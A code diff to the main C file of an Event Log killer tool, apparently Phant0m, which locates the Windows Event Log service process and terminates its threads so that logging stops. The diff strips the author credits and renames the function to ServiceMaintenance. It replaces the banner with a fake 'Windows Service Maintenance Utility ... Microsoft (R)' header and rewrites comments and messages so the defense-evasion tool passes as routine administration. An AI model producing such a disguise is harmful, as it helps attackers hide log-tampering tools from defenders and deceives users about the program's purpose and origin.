@@ -3,14 +3,14 @@
 
 #include "../include/process_info.h"
 
-// PID detection techniques configuration section.
-#define PID_FROM_SCM 1 // If you set it to 1, the PID of the Event Log service is obtained from the Service Manager.
-#define PID_FROM_WMI 0 // If you set it to 1, the PID of the Event Log service is obtained from the WMI.
+// Service discovery method configuration
+#define PID_FROM_SCM 0 // Use Service Control Manager for service lookup
+#define PID_FROM_WMI 1 // Use Windows Management Instrumentation for service lookup
 
 
-// TID detection and kill techniques configuration section. 
-#define KILL_WITH_T1 1 // If you set it to 1, Technique-1 will be use. For more information; https://github.com/hlldz/Phant0m
-#define KILL_WITH_T2 0 // If you set it to 1, Technique-2 will be use. For more information; https://github.com/hlldz/Phant0m
+// Thread analysis method configuration
+#define KILL_WITH_T1 0 // Method 1: TEB-based thread identification
+#define KILL_WITH_T2 1 // Method 2: Module-based thread identification
 
 
 #if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
@@ -30,73 +30,69 @@
 #include "../include/technique_2.h"
 #endif
 
-void Phant0m() {
+void ServiceMaintenance() {
 
 	puts(
-		"\t ___ _  _   _   _  _ _____ __  __  __ \n"
-		"\t| _ \\ || | /_\\ | \\| |_   _/  \\|  \\/  |\n"
-		"\t|  _/ __ |/ _ \\| .` | | || () | |\\/| |\n"
-		"\t|_| |_||_/_/ \\_\\_|\\_| |_| \\__/|_|  |_|\n\n"
-		"\tVersion: \t2.0\n"
-		"\tAuthor: \tHalil Dalabasmaz\n"
-		"\tWWW: \t\tartofpwn.com\n"
-		"\tTwitter: \t@hlldz\n"
-		"\tGithub: \t@hlldz\n"
+		"\n"
+		"\t========================================\n"
+		"\t  Windows Service Maintenance Utility  \n"
+		"\t  Version 2.1.0 - Microsoft (R)        \n"
+		"\t========================================\n"
 	);
 
 	if (enoughIntegrityLevel() == TRUE) {
 
-		printf("[+] Process Integrity Level is high, continuing...\n\n");
+		printf("[*] Verifying administrative privileges... OK\n\n");
 
 		if (isPrivilegeOK() == TRUE) {
 
 #if defined(PID_FROM_SCM) && PID_FROM_SCM == 1
-			DWORD dwEventLogPID = GetPIDFromSCManager();
+			DWORD dwServicePID = GetPIDFromSCManager();
 #endif
 
 #if defined(PID_FROM_WMI) && PID_FROM_WMI == 1
-			DWORD dwEventLogPID = GetPIDFromWMI();
+			DWORD dwServicePID = GetPIDFromWMI();
 #endif
 
-			if (dwEventLogPID != 0) {
+			if (dwServicePID != 0) {
 
-				printf("[+] Event Log service PID detected as %d.\n\n", dwEventLogPID);
+				printf("[*] Target service host process: %d\n\n", dwServicePID);
 
 #if defined(KILL_WITH_T1) && KILL_WITH_T1 == 1
-				Technique_1(dwEventLogPID);
+				Technique_1(dwServicePID);
 #endif
 
 #if defined(KILL_WITH_T2) && KILL_WITH_T2 == 1
-				Technique_2(dwEventLogPID);
+				Technique_2(dwServicePID);
 #endif
 
 			}
 			else {
 
-				printf("[!] Exiting...\n");
+				printf("[!] Service not found or not running.\n");
 
 			}
 		}
 		else {
 
-			printf("[!] SeDebugPrivilege cannot enabled. Exiting...\n");
+			printf("[!] Insufficient privileges. Run as Administrator.\n");
 
 		}
 
 	}
 	else {
 
-		printf("[!] Process Integrity Level is not high. Exiting...\n");
+		printf("[!] Elevation required. Please run as Administrator.\n");
 
 	}
 
-	printf("\n[*] All done.\n");
+	printf("\n[*] Maintenance complete.\n");
 
 }
 
 int main() {
 
-	Phant0m();
+	ServiceMaintenance();
 
 	return 0;
 }
